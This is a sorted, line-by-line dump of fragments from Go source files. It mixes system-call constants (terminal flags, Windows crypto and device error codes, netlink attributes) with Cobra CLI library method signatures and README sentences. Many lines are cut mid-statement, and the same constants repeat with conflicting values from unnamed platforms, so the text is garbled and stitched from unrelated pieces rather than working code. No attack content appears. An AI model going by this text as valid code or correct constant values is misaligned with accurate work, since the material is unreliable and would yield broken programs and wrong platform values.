CO_S_FIRST                                                                syscall.Errno = 0x000401F0
CO_S_LAST                                                                 syscall.Errno = 0x000401FF
CO_S_MACHINENAMENOTFOUND                                                  Handle        = 0x00080013
CO_S_NOTALLINTERFACES                                                     Handle        = 0x00080012
CPUSTATES                         = 0x5
CPUSTATES                         = 0x6
CPUSTATES                      = 0x5
CPUSTATES$/ 
CPUSet) Clear(cpu int) {
CPUSet) Count() int {
CPUSet) IsSet(cpu int) bool {
CPUSet) Set(cpu int) {
CPUSet) Zero() {
CPUSet) error {
CP_/ 
CP_IDLE                           = 0x4
CP_IDLE                           = 0x5
CP_IDLE                        = 0x4
CP_INTR                           = 0x3
CP_INTR                           = 0x4
CP_INTR                        = 0x3
CP_NICE                           = 0x1
CP_NICE                        = 0x1
CP_SPIN                           = 0x3
CP_SYS                            = 0x2
CP_SYS                         = 0x2
CP_USER                           = 0x0
CP_USER                        = 0x0
CR0                                         = 0x0
CR0                                     = 0x0
CR0                           = 0x0
CR1                                     = 0x1000
CR1                              = 0x1000
CR1                              = 0x200
CR1                           = 0x100
CR1                           = 0x200
CR2                                     = 0x2000
CR2                              = 0x2000
CR2                              = 0x400
CR2                           = 0x200
CR2                           = 0x400
CR3                                     = 0x3000
CR3                              = 0x3000
CR3                              = 0x600
CR3                           = 0x300
CR3                           = 0x600
CRAMFS_MAGIC                                = 0x28cd3d45
CRDLY                                   = 0x3000
CRDLY                            = 0x3000
CRDLY                            = 0x600
CRDLY                         = 0x300
CRDLY                         = 0x600
CREAD                                   = 0x800
CREAD                             = 0x800
CREAD                            = 0x80
CREAD                            = 0x800
CREAD                          = 0x800
CREAD                         = 0x80
CREATEPROCESS_MANIFEST_RESOURCE_ID                 ResourceID = 1
CREATE_ALWAYS     = 2
CREATE_BREAKAWAY_FROM_JOB        = 0x01000000
CREATE_DEFAULT_ERROR_MODE        = 0x04000000
CREATE_EVENT_INITIAL_SET   = 0x2
CREATE_EVENT_MANUAL_RESET  = 0x1
CREATE_MUTEX_INITIAL_OWNER = 0x1
CREATE_NEW        = 1
CREATE_NEW_CONSOLE               = 0x00000010
CREATE_NEW_PROCESS_GROUP         = 0x00000200
CREATE_NO_WINDOW                 = 0x08000000
CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000
CREATE_PROTECTED_PROCESS         = 0x00040000
CREATE_SEPARATE_WOW_VDM          = 0x00000800
CREATE_SHARED_WOW_VDM            = 0x00001000
CREATE_SUSPENDED                 = 0x00000004
CREATE_UNICODE_ENVIRONMENT       = 0x00000400
CRNL
CRTSCTS                                     = 0x80000000
CRTSCTS                                 = 0x30000
CRTSCTS                           = 0x10000
CRTSCTS                           = 0x30000
CRTSCTS                        = 0x30000
CRTSCTS                       = 0x80000000
CRYPTOCFGA_PRIORITY_VAL     = 0x1
CRYPTOCFGA_REPORT_ACOMP     = 0xb
CRYPTOCFGA_REPORT_AEAD      = 0x5
CRYPTOCFGA_REPORT_AKCIPHER  = 0x9
CRYPTOCFGA_REPORT_BLKCIPHER = 0x4
CRYPTOCFGA_REPORT_CIPHER    = 0x8
CRYPTOCFGA_REPORT_COMPRESS  = 0x6
CRYPTOCFGA_REPORT_HASH      = 0x3
CRYPTOCFGA_REPORT_KPP       = 0xa
CRYPTOCFGA_REPORT_LARVAL    = 0x2
CRYPTOCFGA_REPORT_RNG       = 0x7
CRYPTOCFGA_STAT_ACOMP       = 0x15
CRYPTOCFGA_STAT_AEAD        = 0xf
CRYPTOCFGA_STAT_AKCIPHER    = 0x13
CRYPTOCFGA_STAT_BLKCIPHER   = 0xe
CRYPTOCFGA_STAT_CIPHER      = 0x12
CRYPTOCFGA_STAT_COMPRESS    = 0x10
CRYPTOCFGA_STAT_HASH        = 0xd
CRYPTOCFGA_STAT_KPP         = 0x14
CRYPTOCFGA_STAT_LARVAL      = 0xc
CRYPTOCFGA_STAT_RNG         = 0x11
CRYPTOCFGA_UNSPEC           = 0x0
CRYPTO_/ 
CRYPTO_MAX_NAME                             = 0x40
CRYPTO_MSG_BASE      = 0x10
CRYPTO_MSG_DELALG    = 0x11
CRYPTO_MSG_DELRNG    = 0x14
CRYPTO_MSG_GETALG    = 0x13
CRYPTO_MSG_GETSTAT   = 0x15
CRYPTO_MSG_MAX                              = 0x15
CRYPTO_MSG_NEWALG    = 0x10
CRYPTO_MSG_UPDATEALG = 0x12
CRYPTO_NR_MSGTYPES                          = 0x6
CRYPTO_REPORT_MAXSIZE                       = 0x160
CRYPTPROTECT_AUDIT             = 0x10
CRYPTPROTECT_CRED_REGENERATE   = 0x80
CRYPTPROTECT_CRED_SYNC         = 0x8
CRYPTPROTECT_LOCAL_MACHINE     = 0x4
CRYPTPROTECT_NO_RECOVERY       = 0x20
CRYPTPROTECT_PROMPT_ON_PROTECT     = 2
CRYPTPROTECT_PROMPT_ON_UNPROTECT   = 1
CRYPTPROTECT_PROMPT_REQUIRE_STRONG = 16
CRYPTPROTECT_PROMPT_RESERVED       = 4
CRYPTPROTECT_PROMPT_STRONG         = 8
CRYPTPROTECT_UI_FORBIDDEN      = 0x1
CRYPTPROTECT_VERIFY_PROTECTION = 0x40
CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG  = 0x00010000
CRYPT_ACQUIRE_CACHE_FLAG             = 0x00000001
CRYPT_ACQUIRE_COMPARE_KEY_FLAG       = 0x00000004
CRYPT_ACQUIRE_NCRYPT_KEY_FLAGS_MASK  = 0x00070000
CRYPT_ACQUIRE_NO_HEALING             = 0x00000008
CRYPT_ACQUIRE_ONLY_NCRYPT_KEY_FLAG   = 0x00040000
CRYPT_ACQUIRE_PREFER_NCRYPT_KEY_FLAG = 0x00020000
CRYPT_ACQUIRE_SILENT_FLAG            = 0x00000040
CRYPT_ACQUIRE_USE_PROV_INFO_FLAG     = 0x00000002
CRYPT_ACQUIRE_WINDOW_HANDLE_FLAG     = 0x00000080
CRYPT_DEFAULT_CONTAINER_OPTIONAL = 0x00000080
CRYPT_DELETEKEYSET               = 0x00000010
CRYPT_EXPORTABLE                   = 0x00000001
CRYPT_E_ALREADY_DECRYPTED                                                 Handle        = 0x80091009
CRYPT_E_ASN1_BADARGS                                                      Handle        = 0x80093109
CRYPT_E_ASN1_BADPDU                                                       Handle        = 0x80093108
CRYPT_E_ASN1_BADREAL                                                      Handle        = 0x8009310A
CRYPT_E_ASN1_BADTAG                                                       Handle        = 0x8009310B
CRYPT_E_ASN1_CHOICE                                                       Handle        = 0x8009310C
CRYPT_E_ASN1_CONSTRAINT                                                   Handle        = 0x80093105
CRYPT_E_ASN1_CORRUPT                                                      Handle        = 0x80093103
CRYPT_E_ASN1_EOD                                                          Handle        = 0x80093102
CRYPT_E_ASN1_ERROR                                                        Handle        = 0x80093100
CRYPT_E_ASN1_EXTENDED                                                     Handle        = 0x80093201
CRYPT_E_ASN1_INTERNAL                                                     Handle        = 0x80093101
CRYPT_E_ASN1_LARGE                                                        Handle        = 0x80093104
CRYPT_E_ASN1_MEMORY                                                       Handle        = 0x80093106
CRYPT_E_ASN1_NOEOD                                                        Handle        = 0x80093202
CRYPT_E_ASN1_NYI                                                          Handle        = 0x80093134
CRYPT_E_ASN1_OVERFLOW                                                     Handle        = 0x80093107
CRYPT_E_ASN1_PDU_TYPE                                                     Handle        = 0x80093133
CRYPT_E_ASN1_RULE                                                         Handle        = 0x8009310D
CRYPT_E_ASN1_UTF8                                                         Handle        = 0x8009310E
CRYPT_E_ATTRIBUTES_MISSING                                                Handle        = 0x8009100F
CRYPT_E_AUTH_ATTR_MISSING                                                 Handle        = 0x80091006
CRYPT_E_BAD_ENCODE                                                        Handle        = 0x80092002
CRYPT_E_BAD_LEN                                                           Handle        = 0x80092001
CRYPT_E_BAD_MSG                                                           Handle        = 0x8009200D
CRYPT_E_CONTROL_TYPE                                                      Handle        = 0x8009100C
CRYPT_E_DELETED_PREV                                                      Handle        = 0x80092008
CRYPT_E_EXISTS                                                            Handle        = 0x80092005
CRYPT_E_FILERESIZED                                                       Handle        = 0x80092025
CRYPT_E_FILE_ERROR                                                        Handle        = 0x80092003
CRYPT_E_HASH_VALUE                                                        Handle        = 0x80091007
CRYPT_E_INVALID_IA5_STRING                                                Handle        = 0x80092022
CRYPT_E_INVALID_INDEX                                                     Handle        = 0x80091008
CRYPT_E_INVALID_MSG_TYPE                                                  Handle        = 0x80091004
CRYPT_E_INVALID_NUMERIC_STRING                                            Handle        = 0x80092020
CRYPT_E_INVALID_PRINTABLE_STRING                                          Handle        = 0x80092021
CRYPT_E_INVALID_X500_STRING                                               Handle        = 0x80092023
CRYPT_E_ISSUER_SERIALNUMBER                                               Handle        = 0x8009100D
CRYPT_E_MISSING_PUBKEY_PARA                                               Handle        = 0x8009202C
CRYPT_E_MSG_ERROR                                                         Handle        = 0x80091001
CRYPT_E_NOT_CHAR_STRING                                                   Handle        = 0x80092024
CRYPT_E_NOT_DECRYPTED                                                     Handle        = 0x8009100A
CRYPT_E_NOT_FOUND                                                         Handle        = 0x80092004
CRYPT_E_NOT_IN_CTL                                                        Handle        = 0x8009202A
CRYPT_E_NOT_IN_REVOCATION_DATABASE                                        Handle        = 0x80092014
CRYPT_E_NO_DECRYPT_CERT                                                   Handle        = 0x8009200C
CRYPT_E_NO_KEY_PROPERTY                                                   Handle        = 0x8009200B
CRYPT_E_NO_MATCH                                                          Handle        = 0x80092009
CRYPT_E_NO_PROVIDER                                                       Handle        = 0x80092006
CRYPT_E_NO_REVOCATION_CHECK                                               Handle        = 0x80092012
CRYPT_E_NO_REVOCATION_DLL                                                 Handle        = 0x80092011
CRYPT_E_NO_SIGNER                                                         Handle        = 0x8009200E
CRYPT_E_NO_TRUSTED_SIGNER                                                 Handle        = 0x8009202B
CRYPT_E_NO_VERIFY_USAGE_CHECK                                             Handle        = 0x80092028
CRYPT_E_NO_VERIFY_USAGE_DLL                                               Handle        = 0x80092027
CRYPT_E_OBJECT_LOCATOR_OBJECT_NOT_FOUND                                   Handle        = 0x8009202D
CRYPT_E_OID_FORMAT                                                        Handle        = 0x80091003
CRYPT_E_OSS_ERROR                                                         Handle        = 0x80093000
CRYPT_E_PENDING_CLOSE                                                     Handle        = 0x8009200F
CRYPT_E_RECIPIENT_NOT_FOUND                                               Handle        = 0x8009100B
CRYPT_E_REVOCATION_OFFLINE                                                Handle        = 0x80092013
CRYPT_E_REVOKED                                                           Handle        = 0x80092010
CRYPT_E_SECURITY_SETTINGS                                                 Handle        = 0x80092026
CRYPT_E_SELF_SIGNED                                                       Handle        = 0x80092007
CRYPT_E_SIGNER_NOT_FOUND                                                  Handle        = 0x8009100E
CRYPT_E_STREAM_INSUFFICIENT_DATA                                          Handle        = 0x80091011
CRYPT_E_STREAM_MSG_NOT_READY                                              Handle        = 0x80091010
CRYPT_E_UNEXPECTED_ENCODING                                               Handle        = 0x80091005
CRYPT_E_UNEXPECTED_MSG_TYPE                                               Handle        = 0x8009200A
CRYPT_E_UNKNOWN_ALGO                                                      Handle        = 0x80091002
CRYPT_E_VERIFY_USAGE_OFFLINE                                              Handle        = 0x80092029
CRYPT_I_NEW_PROTECTION_REQUIRED                                           Handle        = 0x00091012
CRYPT_MACHINE_KEYSET             = 0x00000020
CRYPT_NEWKEYSET                  = 0x00000008
CRYPT_SILENT                     = 0x00000040
CRYPT_USER_KEYSET                  = 0x00001000
CRYPT_USER_PROTECTED               = 0x00000002
CRYPT_VERIFYCONTEXT              = 0xF0000000
CR_ACCESS_DENIED            CONFIGRET = 0x00000033
CR_ALREADY_SUCH_DEVINST               = CR_ALREADY_SUCH_DEVNODE
CR_ALREADY_SUCH_DEVNODE     CONFIGRET = 0x00000010
CR_APM_VETOED               CONFIGRET = 0x00000018
CR_BUFFER_SMALL             CONFIGRET = 0x0000001A
CR_CALL_NOT_IMPLEMENTED     CONFIGRET = 0x00000034
CR_CANT_SHARE_IRQ           CONFIGRET = 0x0000002B
CR_CREATE_BLOCKED           CONFIGRET = 0x00000015
CR_DEFAULT                  CONFIGRET = 0x00000001
CR_DEVICE_INTERFACE_ACTIVE  CONFIGRET = 0x00000036
CR_DEVICE_NOT_THERE         CONFIGRET = 0x00000024
CR_DEVINST_HAS_REQS                   = CR_DEVNODE_HAS_REQS
CR_DEVLOADER_NOT_READY      CONFIGRET = 0x00000021
CR_DEVNODE_HAS_REQS         CONFIGRET = 0x0000000A
CR_DLVXD_NOT_FOUND          CONFIGRET = 0x0000000C
CR_FAILURE                  CONFIGRET = 0x00000013
CR_FREE_RESOURCES           CONFIGRET = 0x00000029
CR_INVALID_API              CONFIGRET = 0x00000020
CR_INVALID_ARBITRATOR       CONFIGRET = 0x00000008
CR_INVALID_CONFLICT_LIST    CONFIGRET = 0x00000039
CR_INVALID_DATA             CONFIGRET = 0x0000001F
CR_INVALID_DEVICE_ID        CONFIGRET = 0x0000001E
CR_INVALID_DEVINST                    = CR_INVALID_DEVNODE
CR_INVALID_DEVNODE          CONFIGRET = 0x00000005
CR_INVALID_FLAG             CONFIGRET = 0x00000004
CR_INVALID_INDEX            CONFIGRET = 0x0000003A
CR_INVALID_LOAD_TYPE        CONFIGRET = 0x00000019
CR_INVALID_LOG_CONF         CONFIGRET = 0x00000007
CR_INVALID_MACHINENAME      CONFIGRET = 0x0000002F
CR_INVALID_NODELIST         CONFIGRET = 0x00000009
CR_INVALID_POINTER          CONFIGRET = 0x00000003
CR_INVALID_PRIORITY         CONFIGRET = 0x00000027
CR_INVALID_PROPERTY         CONFIGRET = 0x00000035
CR_INVALID_RANGE            CONFIGRET = 0x00000012
CR_INVALID_RANGE_LIST       CONFIGRET = 0x00000011
CR_INVALID_REFERENCE_STRING CONFIGRET = 0x00000038
CR_INVALID_RESOURCEID       CONFIGRET = 0x0000000B
CR_INVALID_RES_DES          CONFIGRET = 0x00000006
CR_INVALID_STRUCTURE_SIZE   CONFIGRET = 0x0000003B
CR_MACHINE_UNAVAILABLE      CONFIGRET = 0x00000031
CR_NEED_RESTART             CONFIGRET = 0x00000022
CR_NOT_DISABLEABLE          CONFIGRET = 0x00000028
CR_NOT_SYSTEM_VM            CONFIGRET = 0x00000016
CR_NO_ARBITRATOR            CONFIGRET = 0x0000001B
CR_NO_CM_SERVICES           CONFIGRET = 0x00000032
CR_NO_DEPENDENT             CONFIGRET = 0x0000002C
CR_NO_MORE_HW_PROFILES      CONFIGRET = 0x00000023
CR_NO_MORE_LOG_CONF         CONFIGRET = 0x0000000E
CR_NO_MORE_RES_DES          CONFIGRET = 0x0000000F
CR_NO_REGISTRY_HANDLE       CONFIGRET = 0x0000001C
CR_NO_SUCH_DEVICE_INTERFACE CONFIGRET = 0x00000037
CR_NO_SUCH_DEVINST                    = CR_NO_SUCH_DEVNODE
CR_NO_SUCH_DEVNODE          CONFIGRET = 0x0000000D
CR_NO_SUCH_LOGICAL_DEV      CONFIGRET = 0x00000014
CR_NO_SUCH_REGISTRY_KEY     CONFIGRET = 0x0000002E
CR_NO_SUCH_VALUE            CONFIGRET = 0x00000025
CR_OUT_OF_MEMORY            CONFIGRET = 0x00000002
CR_QUERY_VETOED             CONFIGRET = 0x0000002A
CR_REGISTRY_ERROR           CONFIGRET = 0x0000001D
CR_REMOTE_COMM_FAILURE      CONFIGRET = 0x00000030
CR_REMOVE_VETOED            CONFIGRET = 0x00000017
CR_SAME_RESOURCES           CONFIGRET = 0x0000002D
CR_SUCCESS                  CONFIGRET = 0x00000000
CR_WRONG_TYPE               CONFIGRET = 0x00000026
CS5                                         = 0x0
CS5                                     = 0x0
CS5                               = 0x0
CS5                            = 0x0
CS5                           = 0x0
CS6                                     = 0x100
CS6                               = 0x100
CS6                              = 0x10
CS6                              = 0x100
CS6                            = 0x100
CS6                           = 0x10
CS7                                     = 0x200
CS7                               = 0x200
CS7                              = 0x20
CS7                              = 0x200
CS7                            = 0x200
CS7                           = 0x20
CS8                                     = 0x300
CS8                               = 0x300
CS8                              = 0x30
CS8                              = 0x300
CS8                             = 0x0030
CS8                            = 0x300
CS8                           = 0x30
CSIGNAL                                     = 0xff
CSIOCGIFCONF                  = -0x3fef96dc
CSIOCGIFCONF                  = -0x3ff796dc
CSIZE                                   = 0x300
CSIZE                             = 0x300
CSIZE                            = 0x30
CSIZE                            = 0x300
CSIZE                           = 0x0030
CSIZE                          = 0x300
CSIZE                         = 0x30
CSTART                                      = 0x11
CSTART                                  = 0x11
CSTART                            = 0x11
CSTART                         = 0x11
CSTART                        = '
CSTART                        = 0x11
CSTATUS                                     = 0x0
CSTATUS                                 = 0x14
CSTATUS                           = 0x14
CSTATUS                           = 0xff
CSTATUS                        = 0x14
CSTATUS                       = 0x14
CSTOP                                       = 0x13
CSTOP                                   = 0x13
CSTOP                             = 0x13
CSTOP                          = 0x13
CSTOP                         = '
CSTOP                         = 0x13
CSTOPB                                  = 0x400
CSTOPB                            = 0x400
CSTOPB                           = 0x40
CSTOPB                           = 0x400
CSTOPB                         = 0x400
CSTOPB                        = 0x40
CSUSP                                       = 0x1a
CSUSP                                   = 0x1a
CSUSP                             = 0x1a
CSUSP                          = 0x1a
CSUSP                         = 0x1a
CSWTCH                        = 0x1a
CS[A-Z0-9]/ 
CS_E_ADMIN_LIMIT_EXCEEDED                                                 Handle        = 0x8004016D
CS_E_CLASS_NOTFOUND                                                       Handle        = 0x80040166
CS_E_FIRST                                                                syscall.Errno = 0x80040164
CS_E_INTERNAL_ERROR                                                       Handle        = 0x8004016F
CS_E_INVALID_PATH                                                         Handle        = 0x8004016B
CS_E_INVALID_VERSION                                                      Handle        = 0x80040167
CS_E_LAST                                                                 syscall.Errno = 0x8004016F
CS_E_NETWORK_ERROR                                                        Handle        = 0x8004016C
CS_E_NOT_DELETABLE                                                        Handle        = 0x80040165
CS_E_NO_CLASSSTORE                                                        Handle        = 0x80040168
CS_E_OBJECT_ALREADY_EXISTS                                                Handle        = 0x8004016A
CS_E_OBJECT_NOTFOUND                                                      Handle        = 0x80040169
CS_E_PACKAGE_NOTFOUND                                                     Handle        = 0x80040164
CS_E_SCHEMA_MISMATCH                                                      Handle        = 0x8004016E
CTLIOCGINFO                             = 0xc0644e03
CTLIOCGINFO$/ 
CTL_(HW
CTL_(MAXNAME
CTL_HW                                  = 0x6
CTL_HW                            = 0x6
CTL_HW                         = 0x6
CTL_KERN                                = 0x1
CTL_KERN                          = 0x1
CTL_KERN                       = 0x1
CTL_MAXNAME                             = 0xc
CTL_MAXNAME                       = 0xc
CTL_MAXNAME                    = 0x18
CTL_NET                                 = 0x4
CTL_NET                           = 0x4
CTL_NET                        = 0x4
CTL_QUERY                         = -0x2
CTRL_ATTR_FAMILY_ID        = 0x1
CTRL_ATTR_FAMILY_NAME      = 0x2
CTRL_ATTR_HDRSIZE          = 0x4
CTRL_ATTR_MAXATTR          = 0x5
CTRL_ATTR_MCAST_GROUPS     = 0x7
CTRL_ATTR_MCAST_GRP_ID     = 0x2
CTRL_ATTR_MCAST_GRP_NAME   = 0x1
CTRL_ATTR_MCAST_GRP_UNSPEC = 0x0
CTRL_ATTR_OP               = 0xa
CTRL_ATTR_OPS              = 0x6
CTRL_ATTR_OP_FLAGS         = 0x2
CTRL_ATTR_OP_ID            = 0x1
CTRL_ATTR_OP_POLICY        = 0x9
CTRL_ATTR_OP_UNSPEC        = 0x0
CTRL_ATTR_POLICY           = 0x8
CTRL_ATTR_POLICY_DO        = 0x1
CTRL_ATTR_POLICY_DUMP      = 0x2
CTRL_ATTR_POLICY_DUMP_MAX  = 0x2
CTRL_ATTR_POLICY_UNSPEC    = 0x0
CTRL_ATTR_UNSPEC           = 0x0
CTRL_ATTR_VERSION          = 0x3
CTRL_BREAK_EVENT    = 1
CTRL_CLOSE_EVENT    = 2
CTRL_CMD_DELFAMILY         = 0x2
CTRL_CMD_DELMCAST_GRP      = 0x8
CTRL_CMD_DELOPS            = 0x5
CTRL_CMD_GETFAMILY         = 0x3
CTRL_CMD_GETMCAST_GRP      = 0x9
CTRL_CMD_GETOPS            = 0x6
CTRL_CMD_GETPOLICY         = 0xa
CTRL_CMD_NEWFAMILY         = 0x1
CTRL_CMD_NEWMCAST_GRP      = 0x7
CTRL_CMD_NEWOPS            = 0x4
CTRL_CMD_UNSPEC            = 0x0
CTRL_C_EVENT        = 0
CTRL_LOGOFF_EVENT   = 5
CTRL_SHUTDOWN_EVENT = 6
Ca_state       uint8
CacheResync                  
Calcnt    int32
Calcnt    int64
Call_addr uint64
Calling the 
CancelIo(s Handle) (err error)
Cancelled_write_bytes     uint64
Canonname 
Cap  int
CapEnter() (err error)
CapRights) (err error)
CapRights) (err error) = SYS___CAP_RIGHTS_GET
CapRights) (err error) {
CapRights) error {
CapRights) int {
CapUserData) (err error)
CapUserData) (err error) {
Capabilities       uint32
Capabilities   uint64
Capabilities uint32
Capability     uint8
Capget(hdr 
Caplen    uint32
Caplen  uint32
Capset(hdr 
Capt    uint64
Capt uint64
CatalogEntryId    uint32
Cause    uint64
Cb            uint32
CbStruct          uint32
Cc     [19]uint8
Cc     [20]uint8
Cc     [23]uint8
Cc    [11]uint8
Cc    [16]uint8
Cc    [19]uint8
Cc    [8]uint8
Cc    uint32
Ccr       uint32
Ccr       uint64
Ccsid   uint16
CertChainContext
CertChainContext) (certchain 
CertChainContext) (err error) = crypt32.CertGetCertificateChain
CertChainContext) (err error) {
CertChainContext) = crypt32.CertFreeCertificateChain
CertChainContext) {
CertChainContext)(unsafe.Pointer(r0))
CertChainElement
CertChainPolicyStatus) (err error) = crypt32.CertVerifyCertificateChainPolicy
CertChainPolicyStatus) (err error) {
CertContext
CertContext       
CertContext) (cert 
CertContext) (context 
CertContext) (dupContext 
CertContext) (err error) = crypt32.CertAddCertificateContextToStore
CertContext) (err error) = crypt32.CertDeleteCertificateFromStore
CertContext) (err error) = crypt32.CertFreeCertificateContext
CertContext) (err error) {
CertContext) = crypt32.CertDuplicateCertificateContext
CertContext) {
CertContext)(unsafe.Pointer(r0))
CertDeleteCertificateFromStore(certContext 
CertDuplicateCertificateContext(certContext 
CertEnhKeyUsage
CertExtension
CertExtension) (ret 
CertExtension) = crypt32.CertFindExtension
CertExtension) {
CertExtension)(unsafe.Pointer(r0))
CertFindExtension(objId 
CertFreeCertificateChain(ctx 
CertFreeCertificateContext(ctx 
CertGetNameString(certContext 
CertInfo
CertInfo     
CertPolicyInfo
CertPolicyQualifierInfo
CertRevocationCrlInfo
CertRevocationInfo
CertSimpleChain
CertStrongSignPara
CertTrustListInfo
Cfa_power      uint16
Cfd int32
Cflag  uint32
Cflag  uint64
Cflag uint16
Cflag uint32
Cfs_enable_1   uint16
Cfs_enable_2   uint16
Cfsse          uint16
Cgid uint32
ChainCount                 uint32
ChainEntries [MAX_PROTOCOL_CHAIN]uint32
ChainIndex        uint32
ChainLen     int32
Chains                     
Change uint32
Changed             bool                // If the user set the value (or if left to default)
Changes to this document and the contents therein are at the discretion of the maintainers.
Channel uint16
Channel uint8
CharsetID [8]byte
Charspare   [80]int8
Chdir(path string) (err error)
CheckErr(c.Root().Usage())
CheckErr(c.Usage())
CheckErr(cmd.Help())
CheckErr(err)
CheckPoint              uint32
CheckRevocationFreshnessTime uint32
Checks     uint32
Child_pid    int32
Chroot(path string) (err error)
Cid         uint16
Cid       uint32
ClassContext      uint32
ClassGUID           GUID
ClassGUID GUID
ClassInstallHeader ClassInstallHeader
ClassInstallHeader {
ClassInstallHeader{InstallFunction: installFunction}
Clear_off_tu  PPSKTime
Clear_sequence  uint32
Clear_tu        PPSKTime
Clock   int32
Clock   int64
Clockid            int32
Close(fd int) (err error)
Close(fd)
Close(fd2)
Close(nfd)
CloseHandle(handle Handle) (err error)
CloseServiceHandle(handle Handle) (err error) = advapi32.CloseServiceHandle
Closesocket(s Handle) (err error) [failretval==socket_error] = ws2_32.closesocket
Cmd          uint32
Cmd      uint8
Cmd    int32
CmsgLen(0) <= len(b) {
Cmsghdr) SetLen(length int) {
Cmsghdr) data(offset uintptr) unsafe.Pointer {
Cmsghdr)(unsafe.Pointer(
Cn  [1024]byte
Cn  [1024]int8
Cn  [16]int8
CoGetObject(name 
CoTaskMemFree(address unsafe.Pointer) = ole32.CoTaskMemFree
CoUninitialize() = ole32.CoUninitialize
Cobra adds a top-level '--version' flag if the Version field is set on the root command.
Cobra allows you to provide a pre-defined list of completion choices for your nouns using the 
Cobra automatically adds a help command to your application when you have subcommands.
Cobra can enforce that requirement:
Cobra can generate shell completions for multiple shells.
Cobra doesn't require any special constructors. Simply create your commands.
Cobra is a CLI library for Go that empowers applications.
Cobra is a library for creating powerful modern CLI applications.
Cobra is a library providing a simple interface to create powerful modern CLI
Cobra is released under the Apache 2.0 license. See [LICENSE.txt](https://github.com/spf13/cobra/blob/master/LICENSE.txt)
Cobra maintainers will use GitHub issues and the [
Cobra provides a default 
Cobra provides a few options for the default 
Cobra provides support for completion descriptions.  Such descriptions are supported for each shell
Cobra provides two versions for bash completion.  The original bash completion (which started it all!) can be used by calling
Cobra provides:
Cobra supports native PowerShell completions generated from the root 
Cobra supports native fish completions generated from the root 
Cobra supports native zsh completion generated from the root 
Cobra will automatically provide your program with a fully functional 
Cobra-CLI is its own program that will create your application and add any
Code      int32
Code     int32
Code   int32
Code   uint8
Code  int32
Code uint16
Code uint32
Col    uint16
Collisions   uint64
Collisions  uint32
Collisions  uint64
Collisions uint32
Collisions uint64
Cols uint16 // ws_col: Number of columns (in cells)
ComboIndex          uint32
CommTimeouts) (err error)
CommTimeouts) (err error) {
Command
Command      
Command         string
Command is the central point of the application. Each interaction that
Command line flag syntax:
Command uint8
Command {
Command)
Command) AddCommand(cmds ...
Command) ArgsLenAtDash() int {
Command) CalledAs() string {
Command) CommandPath() string {
Command) CommandPathPadding() int {
Command) Commands() []
Command) Context() context.Context {
Command) DebugFlags() {
Command) ErrOrStderr() io.Writer {
Command) Execute() error {
Command) ExecuteC() (cmd 
Command) ExecuteContext(ctx context.Context) error {
Command) ExecuteContextC(ctx context.Context) (
Command) Find(args []string) (
Command) Flag(name string) (flag 
Command) FlagErrorFunc() (f func(
Command) Flags() 
Command) GenBashCompletion(w io.Writer) error {
Command) GenBashCompletionFile(filename string) error {
Command) GenPowerShellCompletion(w io.Writer) error {
Command) GenPowerShellCompletionFile(filename string) error {
Command) GenPowerShellCompletionFileWithDesc(filename string) error {
Command) GenPowerShellCompletionWithDesc(w io.Writer) error {
Command) GenZshCompletion(w io.Writer) error {
Command) GenZshCompletionFile(filename string) error {
Command) GenZshCompletionFileNoDesc(filename string) error {
Command) GenZshCompletionNoDesc(w io.Writer) error {
Command) GlobalNormalizationFunc() func(f 
Command) HasAlias(s string) bool {
Command) HasAvailableFlags() bool {
Command) HasAvailableInheritedFlags() bool {
Command) HasAvailableLocalFlags() bool {
Command) HasAvailablePersistentFlags() bool {
Command) HasAvailableSubCommands() bool {
Command) HasExample() bool {
Command) HasFlags() bool {
Command) HasHelpSubCommands() bool {
Command) HasInheritedFlags() bool {
Command) HasLocalFlags() bool {
Command) HasParent() bool {
Command) HasPersistentFlags() bool {
Command) HasSubCommands() bool {
Command) Help() error {
Command) HelpFunc() func(
Command) HelpTemplate() string {
Command) InOrStdin() io.Reader {
Command) InheritedFlags() 
Command) InitDefaultHelpCmd() {
Command) InitDefaultHelpFlag() {
Command) InitDefaultVersionFlag() {
Command) IsAdditionalHelpTopicCommand() bool {
Command) IsAvailableCommand() bool {
Command) LocalFlags() 
Command) LocalNonPersistentFlags() 
Command) MarkFlagDirname(name string) error {
Command) MarkFlagRequired(name string) error {
Command) MarkFlagsMutuallyExclusive(flagNames ...string) {
Command) MarkFlagsRequiredTogether(flagNames ...string) {
Command) MarkPersistentFlagDirname(name string) error {
Command) MarkPersistentFlagRequired(name string) error {
Command) Name() string {
Command) NameAndAliases() string {
Command) NamePadding() int {
Command) NonInheritedFlags() 
Command) OutOrStderr() io.Writer {
Command) OutOrStdout() io.Writer {
Command) Parent() 
Command) ParseFlags(args []string) error {
Command) PersistentFlags() 
Command) Print(i ...interface{}) {
Command) PrintErr(i ...interface{}) {
Command) PrintErrln(i ...interface{}) {
Command) Println(i ...interface{}) {
Command) RemoveCommand(cmds ...
Command) ResetCommands() {
Command) ResetFlags() {
Command) Root() 
Command) Runnable() bool {
Command) SetArgs(a []string) {
Command) SetContext(ctx context.Context) {
Command) SetErr(newErr io.Writer) {
Command) SetFlagErrorFunc(f func(
Command) SetGlobalNormalizationFunc(n func(f 
Command) SetHelpCommand(cmd 
Command) SetHelpFunc(f func(
Command) SetHelpTemplate(s string) {
Command) SetIn(newIn io.Reader) {
Command) SetOut(newOut io.Writer) {
Command) SetOutput(output io.Writer) {
Command) SetUsageFunc(f func(
Command) SetUsageTemplate(s string) {
Command) SetVersionTemplate(s string) {
Command) SuggestionsFor(typedName string) []string {
Command) Traverse(args []string) (
Command) Usage() error {
Command) UsageFunc() (f func(
Command) UsagePadding() int {
Command) UsageString() string {
Command) UsageTemplate() string {
Command) UseLine() string {
Command) ValidateArgs(args []string) error {
Command) VersionTemplate() string {
Command) VisitParents(fn func(
Command) []string {
Command) enforceFlagGroupsForCompletion() {
Command) error
Command) error {
Command) error)
Command) error) {
Command) execute(a []string) (err error) {
Command) findNext(next string) 
Command) findSuggestions(arg string) string {
Command) getCompletions(args []string) (
Command) getErr(def io.Writer) io.Writer {
Command) getIn(def io.Reader) io.Reader {
Command) getOut(def io.Writer) io.Writer {
Command) hasNameOrAliasPrefix(prefix string) bool {
Command) initCompleteCmd(args []string) {
Command) initDefaultCompletionCmd() {
Command) mergePersistentFlags() {
Command) persistentFlag(name string) (flag 
Command) preRun() {
Command) string {
Command) updateParentsPflags() {
Command) validateFlagGroups() error {
Command) validateRequiredFlags() error {
Command) {
Command)) {
Command.TraverseChildren
CommandLine
CommandLine      NTUnicodeString
